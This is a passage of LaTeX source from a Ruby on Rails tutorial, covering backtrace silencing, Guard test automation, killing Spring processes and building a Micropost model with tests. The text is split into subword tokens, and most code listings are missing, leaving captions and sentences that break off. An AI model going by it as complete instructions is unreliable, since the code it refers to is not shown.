▁The ▁result ing ▁ backtrace ▁is ▁often ▁in co n ve n i ent ly ▁long , ▁es pecially ▁since ▁the ▁source ▁of ▁the ▁problem ▁is ▁usually ▁the ▁application ▁and ▁not ▁one ▁of ▁its ▁dependencies .
▁The ▁solution ▁is ▁to ▁filter ▁the ▁ backtrace ▁to ▁eliminate ▁un w ant ed ▁lines .
▁This ▁requires ▁the ▁\ href { https :// github . com / meta skills / mini _ backtrace }{\ text tt { mini \_ backtrace } } ▁gem ▁included ▁in ▁Listing ~\ ref { code : gemfile _ sample _ app }, ▁combine d ▁with ▁a ▁\ emph { backtrace ▁ silencer }.
▁On ▁the ▁cloud ▁IDE , ▁most ▁un w ant ed ▁lines ▁contain ▁the ▁string ▁\ k ode { rvm } ▁( ref er r ing ▁to ▁the ▁Ruby ▁ Version ▁M an age r ), ▁so ▁I ▁recommend ▁using ▁the ▁ silencer ▁show n ▁in ▁Listing ~\ ref { code : backtrace _ silencer } ▁to ▁filter ▁them ▁out .
▁ Adding ▁a ▁ backtrace ▁ silencer ▁for ▁RVM .
▁# ▁Be ▁sure ▁to ▁restart ▁your ▁server ▁when ▁you ▁modify ▁this ▁file .
▁# ▁Rails . backtrace _ c le an er . remove _ silencer s !
▁As ▁noted ▁in ▁a ▁comment ▁in ▁Listing ~\ ref { code : backtrace _ silencer }, ▁you ▁should ▁restart ▁the ▁local ▁webserver ▁after ▁adding ▁the ▁ silencer .
▁One ▁an no y ance ▁ associated ▁with ▁using ▁the ▁\ k ode { rake ▁test } ▁command ▁is ▁ having ▁to ▁switch ▁to ▁the ▁command ▁line ▁and ▁run ▁the ▁tests ▁by ▁hand .
▁To ▁avoid ▁this ▁in co n ve n i ence , ▁we ▁can ▁use ▁\ href { https :// github . com / guard / guard }{\ emph { G u ar d } } ▁to ▁automate ▁the ▁running ▁of ▁the ▁tests .
▁Guard ▁m on it or s ▁changes ▁in ▁the ▁file system ▁so ▁that , ▁for ▁example , ▁when ▁we ▁change ▁the ▁\ k ode { static \_ pages \_ controller \_ test . rb } ▁file , ▁only ▁those ▁tests ▁get ▁run .
▁ $ ▁bundle ▁exec ▁ guard ▁in it < n > Writ ing ▁new ▁ Guardfile ▁to ▁/ home / u b un t u / workspace / sample _ app / Guardfile < n > 00 : 5 1 : 3 2 ▁- ▁INFO ▁- ▁ mini test ▁ guard ▁added ▁to ▁ Guardfile , ▁feel ▁free ▁to ▁edit ▁it
▁We ▁the n ▁edit ▁the ▁result ing ▁\ k ode { Guardfile } ▁so ▁that ▁Guard ▁will ▁run ▁the ▁right ▁tests ▁when ▁the ▁integration ▁tests ▁and ▁views ▁are ▁updated ▁( Listing ~\ ref { code : guard file }).
▁( G ive n ▁its ▁length ▁and ▁advanced ▁nature , ▁I ▁recommend ▁just ▁copy - and - past ing ▁the ▁contents ▁of ▁Listing ~\ ref { code : guard file }. )
▁A ▁custom ▁\ k ode { Guardfile }.
▁# ▁Defin es ▁the ▁matching ▁rules ▁for ▁Guard .
▁Here ▁the ▁line
▁cause s ▁Guard ▁to ▁use ▁the ▁S p r ing ▁server ▁supplied ▁by ▁Rails ▁to ▁speed ▁up ▁load ing ▁time s , ▁while ▁also ▁prevent ing ▁Guard ▁from ▁running ▁the ▁full ▁test ▁suite ▁upon ▁starting .
▁To ▁prevent ▁conflicts ▁between ▁S p r ing ▁and ▁Git ▁when ▁using ▁Guard , ▁you ▁should ▁add ▁the ▁\ k ode { spring / } ▁directory ▁to ▁the ▁\ k ode { . gitignore } ▁file ▁used ▁by ▁Git ▁to ▁determine ▁what ▁to ▁ignore ▁when ▁adding ▁files ▁or ▁directories ▁to ▁the ▁repository .
▁The ▁way ▁to ▁do ▁this ▁using ▁the ▁cloud ▁IDE ▁is ▁as ▁follows :
▁Click ▁on ▁the ▁gear ▁icon ▁in ▁the ▁upper ▁right ▁part ▁of ▁the ▁file ▁navigation ▁p an e ▁( F igure ~\ ref { fig : file _ nav ig at or _ ge ar _ ic on }).
▁S el ec t ▁`` S how ▁hidden ▁files '' ▁to ▁show ▁the ▁\ k ode { . gitignore } ▁file ▁in ▁the ▁application ' s ▁root ▁directory ▁( F igure ~\ ref { fig : show _ hidden _ file s }).
▁Do u b le - click ▁on ▁the ▁\ k ode { . gitignore } ▁file ▁( F igure ~\ ref { fig : gitignore }) ▁to ▁open ▁it , ▁and ▁the n ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : gitignore _ spring }.
▁The ▁( rather ▁subtle ) ▁gear ▁icon ▁in ▁the ▁file ▁navigat or ▁p an e .
▁Show ing ▁hidden ▁files ▁in ▁the ▁file ▁navigat or .
▁The ▁normally ▁hidden ▁\ k ode { . gitignore } ▁file ▁made ▁visible .
▁ Adding ▁S p r ing ▁to ▁the ▁\ k ode { . gitignore } ▁file .
▁# ▁See ▁ https :// help . github . com / articles / ig n or ing - file s ▁for ▁more ▁about ▁ignoring < n > # ▁files .
▁< n > # < n > # ▁If ▁you ▁find ▁yourself ▁ignoring ▁temporary ▁files ▁generated ▁by ▁your ▁text ▁editor < n > # ▁or ▁operat ing ▁system , ▁you ▁ probably ▁want ▁to ▁add ▁a ▁g lo b al ▁ignore ▁instead : < n > # ▁git ▁config ▁-- g lo b al ▁core . exclude s file ▁' ~ / . gitignore _ g lo b al ' < n >< n > # ▁I gnore ▁bundle r ▁config .
▁< n > / . bundle < n >< n > # ▁I gnore ▁the ▁default ▁SQLite ▁database .
▁< n > / db / * . sqlite 3 < n > / db / * . sqlite 3- j our n al < n >< n > # ▁I gnore ▁all ▁log file s ▁and ▁te mp file s .
▁< n > / log / * . log < n > / t mp < n >< n > # ▁I gnore ▁S p r ing ▁files .
▁The ▁S p r ing ▁server ▁is ▁ still ▁a ▁little ▁ q u ir k y ▁as ▁of ▁this ▁writing , ▁and ▁some times ▁S p r ing ▁\ emph { process es } ▁will ▁a cc um ul ate ▁and ▁ s low ▁performance ▁of ▁your ▁tests .
▁Unix ▁process es
▁On ▁Unix - like ▁systems ▁such ▁as ▁L in u x ▁and ▁OS ▁ X , ▁user ▁and ▁system ▁task s ▁each ▁take ▁place ▁within ▁a ▁well - defined ▁contain er ▁called ▁a ▁\ emph { process }.
▁To ▁see ▁all ▁the ▁process es ▁on ▁your ▁system , ▁you ▁can ▁use ▁the ▁\ text tt { p s } ▁command ▁with ▁the ▁\ text tt { a u x } ▁options :
▁< n > ▁ $ ▁p s ▁aux
▁To ▁filter ▁the ▁process es ▁by ▁type , ▁you ▁can ▁run ▁the ▁results ▁of ▁\ text tt { p s } ▁through ▁the ▁\ text tt { g re p } ▁pattern - match er ▁using ▁a ▁Unix ▁p ip e ~\ text tt { | } :
▁< n > ▁ $ ▁p s ▁aux ▁| ▁g re p ▁ spring < n > ▁ u b un t u ▁1 22 4 1 ▁0 . 3 ▁0 . 5 ▁ 58 99 60 ▁1 78 4 16 ▁ ?
▁S s l ▁Sep 20 ▁1 : 4 6 < n > ▁ spring ▁app ▁| ▁sample _ app ▁| ▁started ▁7 ▁hours ▁ ago
▁The ▁result ▁show n ▁gives ▁some ▁details ▁about ▁the ▁process , ▁but ▁the ▁most ▁important ▁thing ▁is ▁the ▁first ▁number , ▁which ▁is ▁the ▁\ emph { process ▁id }, ▁or ▁p id .
▁To ▁eliminate ▁an ▁un w ant ed ▁process , ▁use ▁the ▁\ text tt { k i ll } ▁command ▁to ▁issue ▁the ▁Unix ▁kill ▁code ▁( which ▁\ href { https :// en . wiki p edia . org / wiki / U n i x _ sign al # L ist _ of _ sign al s }{ h app en s ▁to ▁be ~ 9 }) ▁to ▁the ▁p id :
▁This ▁is ▁the ▁technique ▁I ▁recommend ▁for ▁kill ing ▁individual ▁process es , ▁such ▁as ▁a ▁ r o g ue ▁Rails ▁server ▁( with ▁the ▁p id ▁found ▁via ▁\ text tt { p s ▁aux ▁| ▁g re p ▁server }), ▁but ▁some times ▁it ' s ▁convenient ▁to ▁kill ▁all ▁the ▁process es ▁matching ▁a ▁particular ▁process ▁name , ▁such ▁as ▁when ▁you ▁want ▁to ▁kill ▁all ▁the ▁\ text tt { spring } ▁process es ▁g un k ing ▁up ▁your ▁system .
▁In ▁this ▁particular ▁case , ▁you ▁should ▁first ▁try ▁stop p ing ▁the ▁process es ▁with ▁the ▁\ text tt { spring } ▁command ▁itself :
▁< n > ▁ $ ▁ spring ▁stop
▁Sometimes ▁this ▁does n ' t ▁work , ▁though , ▁and ▁you ▁can ▁kill ▁all ▁the ▁process es ▁with ▁name ▁\ text tt { spring } ▁using ▁the ▁\ text tt { p k i ll } ▁command ▁as ▁follows :
▁On ce ▁Guard ▁is ▁configured , ▁you ▁should ▁open ▁a ▁new ▁terminal ▁and ▁( as ▁with ▁the ▁Rails ▁server ▁in ▁Section ~\ ref { sec : rails _ server }) ▁run ▁it ▁at ▁the ▁command ▁line ▁as ▁follows :
▁ $ ▁bundle ▁exec ▁ guard
▁The ▁rules ▁in ▁Listing ~\ ref { code : guard file } ▁are ▁optimized ▁for ▁this ▁tutorial , ▁automatically ▁running ▁( for ▁example ) ▁the ▁integration ▁tests ▁when ▁a ▁controller ▁is ▁changed .
▁To ▁run ▁\ emph { all } ▁the ▁tests , ▁hit ▁return ▁at ▁the ▁\ k ode { guard > } ▁prompt .
▁( This ▁may ▁some times ▁give ▁an ▁error ▁indicat ing ▁a ▁failure ▁to ▁connect ▁to ▁the ▁S p r ing ▁server .
▁To ▁fix ▁the ▁problem , ▁just ▁hit ▁return ▁again .)
▁To ▁exit ▁Guard , ▁press ▁ Ctrl - D . ▁To ▁add ▁ additional ▁match ers ▁to ▁Guard , ▁refer ▁to ▁the ▁examples ▁in ▁Listing ~\ ref { code : guard file }, ▁the ▁\ href { https :// github . com / guard / guard }{ G u ar d ▁README }, ▁and ▁the ▁\ href { https :// github . com / guard / guard / wiki }{ G u ar d ▁ wiki }.
▁In ▁the ▁course ▁of ▁developing ▁the ▁core ▁sample ▁application , ▁we ' ve ▁now ▁ en counter ed ▁four ▁resources --- users , ▁sessions , ▁account ▁activation s , ▁and ▁password ▁\ line break ▁resets --- but ▁only ▁the ▁first ▁of ▁these ▁is ▁back ed ▁by ▁an ▁Active ▁Record ▁model ▁with ▁a ▁table ▁in ▁the ▁database .
▁The ▁time ▁has ▁finally ▁come ▁to ▁add ▁a ▁second ▁such ▁resource : ▁user ▁\ emph { microposts }, ▁which ▁are ▁short ▁messages ▁ associated ▁with ▁a ▁particular ▁user
▁The ▁name ▁is ▁motivate d ▁by ▁the ▁common ▁description ▁of ▁Twitter ▁as ▁a ▁\ emph { micro blog } ; ▁since ▁blog s ▁have ▁posts , ▁microblog s ▁should ▁have ▁microposts .
▁We ▁first ▁saw ▁microposts ▁in ▁ l ar v al ▁form ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁in ▁this ▁chapter ▁we ▁will ▁make ▁a ▁full - strength ▁version ▁of ▁the ▁sketch ▁from ▁Section ~\ ref { sec : microposts _ resource } ▁by ▁construct ing ▁the ▁Micropost ▁data ▁model , ▁associat ing ▁it ▁with ▁the ▁User ▁model ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods , ▁and ▁the n ▁making ▁the ▁forms ▁and ▁partials ▁needed ▁to ▁manipulate ▁and ▁display ▁the ▁results ▁( including , ▁in ▁Section ~\ ref { sec : micropost _ images }, ▁uploaded ▁images ).
▁In ▁Chapter ~\ ref { cha : following _ users }, ▁we ' ll ▁complete ▁our ▁ti n y ▁Twitter ▁ clone ▁by ▁adding ▁the ▁not ion ▁of ▁\ emph { following } ▁users ▁in ▁order ▁to ▁receive ▁a ▁\ emph { feed } ▁of ▁their ▁microposts .
▁< n >< n > ▁\ section { A ▁Micropost ▁model } ▁% ▁( fold )< n > ▁\ label { sec : a _ micropost _ model }< n >< n >
▁We ▁begin ▁the ▁Microposts ▁resource ▁by ▁creating ▁a ▁Micropost ▁model , ▁which ▁capture s ▁the ▁essential ▁character ist ic s ▁of ▁microposts .
▁What ▁follows ▁build s ▁on ▁the ▁work ▁from ▁Section ~\ ref { sec : microposts _ resource } ; ▁as ▁with ▁the ▁model ▁in ▁that ▁section , ▁our ▁new ▁Micropost ▁model ▁will ▁include ▁data ▁validations ▁and ▁an ▁association ▁with ▁the ▁User ▁model .
▁Un like ▁that ▁model , ▁the ▁present ▁Micropost ▁model ▁will ▁be ▁fully ▁test ed , ▁and ▁will ▁also ▁have ▁a ▁default ▁\ emph { order ing } ▁and ▁automatic ▁\ emph { destruction } ▁if ▁its ▁ parent ▁user ▁is ▁destroyed .
▁If ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁I ▁suggest ▁making ▁a ▁topic ▁branch ▁at ▁this ▁time :
▁user - microposts
▁< n >\ end { code }< n >< n > ▁\ subsection { The ▁basic ▁model } ▁% ▁( fold )< n > ▁\ label { sec : the _ basic _ model }< n >< n >
▁The ▁Micropost ▁model ▁needs ▁only ▁two ▁attributes : ▁a ▁\ k ode { content } ▁attribute ▁to ▁hold ▁the ▁micropost ' s ▁content ▁and ▁a ▁\ k ode { user \_ id } ▁to ▁associate ▁a ▁micropost ▁with ▁a ▁particular ▁user .
▁The ▁result ▁is ▁a ▁Micropost ▁model ▁with ▁the ▁structure ▁show n ▁in ▁F igure ~\ ref { fig : micropost _ model }.
▁The ▁Micropost ▁data ▁model .
▁It ' s ▁worth ▁noting ▁that ▁the ▁model ▁in ▁F igure ~\ ref { fig : micropost _ model } ▁uses ▁the ▁\ k ode { text } ▁data ▁type ▁for ▁micropost ▁content ▁( instead ▁of ▁\ k ode { string }), ▁which ▁is ▁capab le ▁of ▁storing ▁an ▁arbitrar y ▁amount ▁of ▁text .
▁Even ▁though ▁the ▁content ▁will ▁be ▁restrict ed ▁to ▁few er ▁than ▁ 140 ▁characters ▁( Section ~\ ref { sec : micropost _ validations }) ▁and ▁hence ▁would ▁fit ▁inside ▁the ▁2 5 5 - character ▁\ k ode { string } ▁type , ▁using ▁\ k ode { text } ▁better ▁express es ▁the ▁nature ▁of ▁microposts , ▁which ▁are ▁more ▁natural ly ▁though t ▁of ▁as ▁blocks ▁of ▁text .
▁Inde ed , ▁in ▁Section ~\ ref { sec : creating _ microposts } ▁we ' ll ▁use ▁a ▁text ▁\ emph { area } ▁instead ▁of ▁a ▁text ▁field ▁for ▁ submitting ▁microposts .
▁In ▁addition , ▁using ▁\ k ode { text } ▁gives ▁us ▁greater ▁flexibility ▁should ▁we ▁wish ▁to ▁increase ▁the ▁length ▁limit ▁at ▁a ▁future ▁date ▁( as ▁part ▁of ▁in ter n ation al i z ation , ▁for ▁example ).
▁As ▁with ▁the ▁case ▁of ▁the ▁User ▁model ▁( Listing ~\ ref { code : generate _ user _ model }), ▁we ▁generate ▁the ▁Micropost ▁model ▁using ▁\ k ode { generate ▁model } :
▁The ▁\ k ode { generate } ▁command ▁produce s ▁a ▁migration ▁to ▁create ▁a ▁\ k ode { microposts } ▁table ▁in ▁the ▁database ▁( Listing ~\ ref { code : micropost _ migration }) ; ▁compare ▁it ▁to ▁the ▁analogous ▁migration ▁for ▁the ▁\ k ode { users } ▁table ▁from ▁Listing ~\ ref { code : users _ migration }.
▁The ▁foreign ▁key ▁reference ▁is ▁a ▁database - level ▁constraint ▁indicat ing ▁that ▁the ▁user ▁id ▁in ▁the ▁microposts ▁table ▁refer s ▁to ▁the ▁id ▁column ▁in ▁the ▁users ▁table .
▁This ▁detail ▁will ▁ never ▁be ▁important ▁in ▁this ▁tutorial , ▁and ▁the ▁foreign ▁key ▁constraint ▁is n ' t ▁even ▁supported ▁by ▁all ▁database s .
▁( It ' s ▁supported ▁by ▁PostgreSQL , ▁which ▁we ▁use ▁in ▁production , ▁but ▁not ▁by ▁the ▁development ▁SQLite ▁database ▁adapter .)
▁We ' ll ▁learn ▁more ▁about ▁foreign ▁keys ▁in ▁Section ~\ ref { sec : relationship _ user _ associations }.
▁As ▁with ▁the ▁User ▁model , ▁the ▁Micropost ▁model ▁migration ▁automatically ▁includes ▁the ▁\ k ode { t . timestamp s } ▁line , ▁which ▁( as ▁mentioned ▁in ▁Section ~\ ref { sec : database _ migrations }) ▁add s ▁the ▁magic ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at } ▁columns ▁show n ▁in ▁F igure ~\ ref { fig : micropost _ model }.
▁( We ' ll ▁put ▁the ▁\ k ode { created \_ at } ▁column ▁to ▁work ▁in ▁Section ~\ ref { sec : order ing _ and _ dependency } ▁and ▁Section ~\ ref { sec : render ing _ microposts }. )
▁The ▁Micropost ▁migration ▁with ▁added ▁index .
▁By ▁including ▁both ▁the ▁\ k ode { user \_ id } ▁and ▁\ k ode { created \_ at } ▁columns ▁as ▁an ▁array , ▁we ▁arrange ▁for ▁Rails ▁to ▁create ▁a ▁\ emph { multiple ▁key ▁index }, ▁which ▁means ▁that ▁Active ▁Record ▁uses ▁\ emph { b o th } ▁keys ▁at ▁the ▁same ▁time .
▁With ▁the ▁migration ▁in ▁Listing ~\ ref { code : micropost _ migration }, ▁we ▁can ▁update ▁the ▁database ▁as ▁usual :
▁Now ▁that ▁we ' ve ▁created ▁the ▁basic ▁model , ▁we ' ll ▁add ▁some ▁validations ▁to ▁enforce ▁the ▁desired ▁design ▁constraints .
▁One ▁of ▁the ▁necessary ▁aspect s ▁of ▁the ▁Micropost ▁model ▁is ▁the ▁presence ▁of ▁a ▁user ▁id ▁to ▁indicate ▁which ▁user ▁made ▁the ▁micropost .
▁The ▁idiomatic ally ▁correct ▁way ▁to ▁do ▁this ▁is ▁to ▁use ▁Active ▁Record ▁\ emph { associations }, ▁which ▁we ' ll ▁implement ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }, ▁but ▁for ▁now ▁we ' ll ▁work ▁with ▁the ▁\ k ode { Micropost } ▁model ▁directly .
▁The ▁initial ▁micropost ▁tests ▁parallel ▁those ▁for ▁the ▁User ▁model ▁( Listing ~\ ref { code : name _ presence _ test }).
▁In ▁the ▁\ k ode { setup } ▁step , ▁we ▁create ▁a ▁new ▁micropost ▁while ▁associat ing ▁it ▁with ▁a ▁valid ▁user ▁from ▁the ▁fixtures , ▁and ▁the n ▁check ▁that ▁the ▁result ▁is ▁valid .
▁Because ▁every ▁micropost ▁should ▁have ▁a ▁user ▁id , ▁we ' ll ▁add ▁a ▁test ▁for ▁a ▁\ k ode { user \_ id } ▁presence ▁validation .
▁P utting ▁these ▁elements ▁together ▁yields ▁the ▁test ▁in ▁Listing ~\ ref { code : micropost _ validity _ test }.
▁Tests ▁for ▁the ▁validity ▁of ▁a ▁new ▁micropost .
▁# ▁This ▁code ▁is ▁not ▁idiomatic ally ▁correct .
▁As ▁indicate d ▁by ▁the ▁comment ▁in ▁the ▁\ k ode { setup } ▁method , ▁the ▁code ▁to ▁create ▁the ▁micropost ▁is ▁not ▁idiomatic ally ▁correct , ▁which ▁we ' ll ▁fix ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }.
▁To ▁fix ▁this , ▁we ▁just ▁need ▁to ▁add ▁the ▁user ▁id ▁presence ▁validation ▁show n ▁in ▁Listing ~\ ref { code : micropost _ user _ id _ validation }.
▁( Note ▁the ▁\ k ode { belongs \_ to } ▁line ▁in ▁Listing ~\ ref { code : micropost _ user _ id _ validation }, ▁which ▁is ▁generated ▁automatically ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : micropost _ migration }.
▁Section ~\ ref { sec : user _ micropost _ associations } ▁discuss es ▁the ▁effect s ▁of ▁this ▁line ▁in ▁more ▁depth .)
▁A ▁validation ▁for ▁the ▁micropost ' s ▁\ k ode { user \_ id }.
▁The ▁model ▁tests ▁should ▁now ▁be ▁\ passing :
▁Next , ▁we ' ll ▁add ▁validations ▁for ▁the ▁micropost ' s ▁\ k ode { content } ▁attribute ▁( following ▁the ▁example ▁from ▁Section ~\ ref { sec : putting _ the _ micro _ in _ microposts }).
▁As ▁with ▁the ▁\ k ode { user \_ id }, ▁the ▁\ k ode { content } ▁attribute ▁must ▁be ▁present , ▁and ▁it ▁is ▁further ▁constrain ed ▁to ▁be ▁no ▁longer ▁than ▁ 140 ▁characters , ▁making ▁it ▁an ▁h one st ▁\ emph { micro } post .
▁We ' ll ▁first ▁write ▁some ▁simple ▁tests , ▁which ▁generally ▁follow ▁the ▁examples ▁from ▁the ▁User ▁model ▁validation ▁tests ▁in ▁Section ~\ ref { sec : user _ validations }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validations _ tests }.
▁Tests ▁for ▁the ▁Micropost ▁model ▁validations .
▁As ▁in ▁Section ~\ ref { sec : user _ validations }, ▁the ▁code ▁in ▁Listing ~\ ref { code : micropost _ validations _ tests } ▁uses ▁string ▁ multi plication ▁to ▁test ▁the ▁micropost ▁length ▁validation :
▁=> ▁" aaaaaaaaaa "
▁ aaaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaaaaaaaaa "
▁The ▁corresponding ▁application ▁code ▁is ▁virtual ly ▁identical ▁to ▁the ▁\ k ode { name } ▁validation ▁for ▁users ▁( Listing ~\ ref { code : length _ validation }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validations }.
▁The ▁Micropost ▁model ▁validations .
▁When ▁construct ing ▁data ▁models ▁for ▁web ▁applications , ▁it ▁is ▁essential ▁to ▁be ▁able ▁to ▁make ▁\ emph { associations } ▁between ▁individual ▁models .
▁In ▁the ▁present ▁case , ▁each ▁micropost ▁is ▁ associated ▁with ▁one ▁user , ▁and ▁each ▁user ▁is ▁ associated ▁with ▁( potentially ) ▁many ▁microposts --- a ▁relationship ▁seen ▁brief ly ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁and ▁show n ▁schematic ally ▁in ▁F igure ~\ ref { fig : micropost _ belongs _ to _ user } ▁and ▁F igure ~\ ref { fig : user _ has _ many _ microposts }.
▁As ▁part ▁of ▁implement ing ▁these ▁associations , ▁we ' ll ▁write ▁tests ▁for ▁the ▁Micropost ▁model ▁and ▁add ▁a ▁couple ▁of ▁tests ▁to ▁the ▁User ▁model .
▁The ▁\ k ode { belongs \_ to } ▁relationship ▁between ▁a ▁micropost ▁and ▁its ▁ associated ▁user .
▁The ▁\ k ode { has \_ many } ▁relationship ▁between ▁a ▁user ▁and ▁its ▁microposts .
▁Using ▁the ▁\ k ode { belongs \_ to } / \ k ode { has \_ many } ▁association ▁defined ▁in ▁this ▁section , ▁\ line break ▁Rails ▁construct s ▁the ▁methods ▁show n ▁in ▁Table ~\ ref { table : association _ methods }.
▁Note ▁from ▁Table ~\ ref { table : association _ methods } ▁that ▁instead ▁of
▁These ▁latter ▁methods ▁ const it ute ▁the ▁idiomatic ally ▁correct ▁way ▁to ▁make ▁a ▁micropost , ▁name ly , ▁\ emph { through } ▁its ▁association ▁with ▁a ▁user .
▁When ▁a ▁new ▁micropost ▁is ▁made ▁in ▁this ▁way , ▁its ▁\ k ode { user \_ id } ▁is ▁automatically ▁set ▁to ▁the ▁right ▁value .
▁In ▁particular , ▁we ▁can ▁replace ▁the ▁code
▁from ▁Listing ~\ ref { code : micropost _ validity _ test } ▁with ▁this :
▁( As ▁with ▁\ k ode { new }, ▁\ k ode { build } ▁returns ▁an ▁object ▁in ▁memory ▁but ▁does n ' t ▁modify ▁the ▁database .)
▁On ce ▁we ▁define ▁the ▁proper ▁associations , ▁the ▁result ing ▁\ k ode {@ micropost } ▁variable ▁will ▁automatically ▁have ▁a ▁\ k ode { user \_ id } ▁attribute ▁equal ▁to ▁its ▁ associated ▁user ' s ▁id .
▁Return s ▁the ▁User ▁object ▁ associated ▁with ▁the ▁micropost
▁Return s ▁a ▁collection ▁of ▁the ▁user ' s ▁microposts
▁Create s ▁a ▁micropost ▁ associated ▁with ▁\ k ode { user }
▁Create s ▁a ▁micropost ▁ associated ▁with ▁\ k ode { user } ▁( exception ▁on ▁failure )
▁Return s ▁a ▁new ▁Micropost ▁object ▁ associated ▁with ▁\ k ode { user }
▁Find s ▁the ▁micropost ▁with ▁id ~\ k ode {1} ▁and ▁\ k ode { user \_ id } ▁equal ▁to ▁\ k ode { user . id }
▁A ▁summary ▁of ▁user / micropost ▁association ▁methods .
▁To ▁get ▁code ▁like ▁\ k ode {@ user . microposts . build } ▁to ▁work , ▁we ▁need ▁to ▁update ▁the ▁User ▁and ▁Micropost ▁models ▁with ▁code ▁to ▁associate ▁them .
▁The ▁first ▁of ▁these ▁was ▁included ▁automatically ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : micropost _ migration } ▁via ▁\ k ode { belongs \_ to ▁: user }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ belongs _ to _ user }.
▁A ▁micropost ▁\ k ode { belongs \_ to } ▁a ▁user .
▁A ▁user ▁\ k ode { has \_ many } ▁microposts .
▁With ▁the ▁association ▁thus ▁made , ▁we ▁can ▁update ▁the ▁\ k ode { setup } ▁method ▁in ▁Listing ~\ ref { code : micropost _ validity _ test } ▁with ▁the ▁idiomatic ally ▁correct ▁way ▁to ▁build ▁a ▁new ▁micropost , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validity _ test _ id io ma tic }.
▁Using ▁idiomatic ally ▁correct ▁code ▁to ▁build ▁a ▁micropost .
▁Of ▁course , ▁after ▁this ▁minor ▁refactoring ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁In ▁this ▁section , ▁we ' ll ▁add ▁a ▁couple ▁of ▁refinement s ▁to ▁the ▁user / micropost ▁association .
▁In ▁particular , ▁we ' ll ▁arrange ▁for ▁a ▁user ' s ▁microposts ▁to ▁be ▁retrieved ▁in ▁a ▁specific ▁\ emph { order }, ▁and ▁we ' ll ▁also ▁make ▁microposts ▁\ emph { dependent } ▁on ▁users ▁so ▁that ▁they ▁will ▁be ▁automatically ▁destroyed ▁if ▁their ▁ associated ▁user ▁is ▁destroyed .
▁Default ▁scope
▁By ▁default , ▁the ▁\ k ode { user . microposts } ▁method ▁make s ▁no ▁guarantee s ▁about ▁the ▁order ▁of ▁the ▁posts , ▁but ▁( following ▁the ▁convention ▁of ▁blog s ▁and ▁Twitter ) ▁we ▁want ▁the ▁microposts ▁to ▁come ▁out ▁in ▁reverse ▁order ▁of ▁when ▁they ▁were ▁created ▁so ▁that ▁the ▁most ▁ recent ▁post ▁is ▁first
▁We ▁brief ly ▁ en counter ed ▁a ▁similar ▁issue ▁in ▁Section ~\ ref { sec : updating _ and _ deleting _ users _ co nclusion } ▁in ▁the ▁context ▁of ▁the ▁users ▁index .
▁We ' ll ▁arrange ▁for ▁this ▁to ▁happen ▁using ▁a ▁\ emph { default ▁scope }.
▁This ▁is ▁exactly ▁the ▁sort ▁of ▁feature ▁that ▁could ▁easily ▁lead ▁to ▁a ▁sp ur ious ▁passing ▁test ▁( i . e . , ▁a ▁test ▁that ▁would ▁pass ▁even ▁if ▁the ▁application ▁code ▁were ▁wrong ), ▁so ▁we ' ll ▁proceed ▁using ▁test - driven ▁development ▁to ▁be ▁sure ▁we ' re ▁testing ▁the ▁right ▁thing .
▁In ▁particular , ▁let ' s ▁write ▁a ▁test ▁to ▁verify ▁that ▁the ▁first ▁micropost ▁in ▁the ▁database ▁is ▁the ▁same ▁as ▁a ▁fixture ▁micropost ▁we ' ll ▁call ▁\ k ode { most \_ recent }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ order _ test }.
▁Testing ▁the ▁micropost ▁order .
▁Listing ~\ ref { code : micropost _ order _ test } ▁relie s ▁on ▁ having ▁some ▁micropost ▁fixtures , ▁which ▁we ▁define ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ fixtures }.
▁Micropost ▁fixtures .
▁Note ▁that ▁we ▁have ▁explicitly ▁set ▁the ▁\ k ode { created \_ at } ▁column ▁using ▁ embedded ▁Ruby .
▁Because ▁it ' s ▁a ▁`` magic '' ▁column ▁automatically ▁updated ▁by ▁Rails , ▁setting ▁it ▁by ▁hand ▁is n ' t ▁or dinarily ▁possible , ▁but ▁it ▁is ▁possible ▁in ▁fixtures .
▁In ▁practice ▁this ▁m ight ▁not ▁be ▁necessary , ▁and ▁in ▁fact ▁on ▁many ▁systems ▁the ▁fixtures ▁are ▁created ▁in ▁order .
▁In ▁this ▁case , ▁the ▁final ▁fixture ▁in ▁the ▁file ▁is ▁created ▁last ▁( and ▁hence ▁is ▁most ▁ recent ), ▁but ▁it ▁would ▁be ▁ foo li s h ▁to ▁rely ▁on ▁this ▁behavior , ▁which ▁is ▁brittle ▁and ▁ probably ▁system - dependent .
▁in ▁Listing ~\ ref { code : micropost _ order _ test } ▁and
▁We ' ll ▁get ▁the ▁test ▁to ▁pass ▁using ▁a ▁Rails ▁method ▁called ▁\ k ode { default \_ scope }, ▁which ▁a mong ▁other ▁things ▁can ▁be ▁used ▁to ▁set ▁the ▁default ▁order ▁in ▁which ▁elements ▁are ▁retrieved ▁from ▁the ▁database .
▁To ▁enforce ▁a ▁particular ▁order , ▁we ' ll ▁include ▁the ▁\ k ode { order } ▁argument ▁in ▁\ k ode { default \_ scope }, ▁which ▁let s ▁us ▁order ▁by ▁the ▁\ k ode { created \_ at } ▁column ▁as ▁follows :
▁To ▁pull ▁them ▁out ▁in ▁reverse ▁order , ▁we ▁can ▁push ▁down ▁one ▁level ▁ deep er ▁and ▁include ▁a ▁string ▁with ▁some ▁raw ▁SQL :
▁SQL ▁is ▁case - insensitive , ▁but ▁it ▁is ▁conventional ▁to ▁write ▁SQL ▁keyword s ▁( such ▁as ▁\ k ode { D E S C }) ▁in ▁all - ca p s .
